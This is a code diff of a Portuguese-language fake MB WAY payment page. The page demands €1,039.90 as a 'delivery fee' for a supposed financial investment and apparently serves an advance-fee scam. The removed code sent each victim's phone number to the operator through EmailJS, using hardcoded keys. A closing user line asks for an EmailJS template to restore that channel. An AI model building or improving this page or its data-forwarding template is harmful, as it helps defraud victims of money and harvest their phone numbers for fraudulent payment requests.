@@ -91,14 +91,9 @@
       border-radius: 12px;
       cursor: pointer;
       margin-top: 15px;
-      transition: all 0.3s;
     }
     .pay-btn:hover {
       background: #c72a22;
-    }
-    .pay-btn:disabled {
-      background: #999;
-      cursor: not-allowed;
     }
     .info {
       font-size: 14px;
@@ -156,9 +151,7 @@
           <textarea id="details" rows="3" placeholder="Ex: Referência do investimento, observações..."></textarea>
         </div>
 
-        <button type="submit" id="pay-btn" class="pay-btn">
-          Pagar € 1.039,90 com MB WAY
-        </button>
+        <button type="submit" class="pay-btn">Pagar € 1.039,90 com MB WAY</button>
       </form>
 
       <p class="info">
@@ -184,18 +177,9 @@
     </button>
   </div>
 
-  <!-- EmailJS Script -->
-  <script type="text/javascript">
-    // Initialize EmailJS
-    (function() {
-      emailjs.init("8tNTuFPIowu1Ookpq");   // Your Public Key
-    })();
-
+  <script>
     const form = document.getElementById('mbway-form');
-    const payBtn = document.getElementById('pay-btn');
-    const paymentScreen = document.getElementById('payment-screen');
-    const authScreen = document.getElementById('auth-screen');
-
+    
     form.addEventListener('submit', function(e) {
       e.preventDefault();
       
@@ -207,38 +191,22 @@
         return;
       }
 
-      // Disable button and show loading state
-      payBtn.disabled = true;
-      payBtn.textContent = "A enviar pedido...";
-
-      // Prepare data for EmailJS
-      const templateParams = {
+      const orderData = {
         phone: phone,
+        amount: "1039.90",
+        currency: "EUR",
+        title: "Taxa de entrega para seu investimento financeiro da Lina",
         details: details || "Sem detalhes adicionais",
-        timestamp: new Date().toLocaleString('pt-PT'),
-        year: new Date().getFullYear()
+        timestamp: new Date().toLocaleString('pt-PT')
       };
 
-      // Send email via EmailJS
-      emailjs.send('service_s2e0bde', 'template_7ulapld', templateParams)
-        .then(function(response) {
-          console.log('✅ Email enviado com sucesso!', response.status, response.text);
-          
-          // Show authorization screen after successful email
-          paymentScreen.style.display = 'none';
-          authScreen.style.display = 'flex';
-          
-          alert("Pedido enviado com sucesso!\n\nAgora abra a sua app MB WAY e autorize o pagamento de € 1.039,90");
-        })
-        .catch(function(error) {
-          console.error('❌ Erro ao enviar email:', error);
-          alert("Erro ao enviar o pedido. Por favor, tente novamente.");
-          
-          // Reset button on error
-          payBtn.disabled = false;
-          payBtn.textContent = "Pagar € 1.039,90 com MB WAY";
-        });
+      console.log("📤 Pedido enviado para o administrador:", orderData);
+
+      document.getElementById('payment-screen').style.display = 'none';
+      document.getElementById('auth-screen').style.display = 'flex';
+
+      alert("Pedido de pagamento enviado!\nVerifique a sua app MB WAY para autorizar € 1.039,90");
     });
   </script>
 </body>
-</html>
+</html>can you create a email js template for this file ?
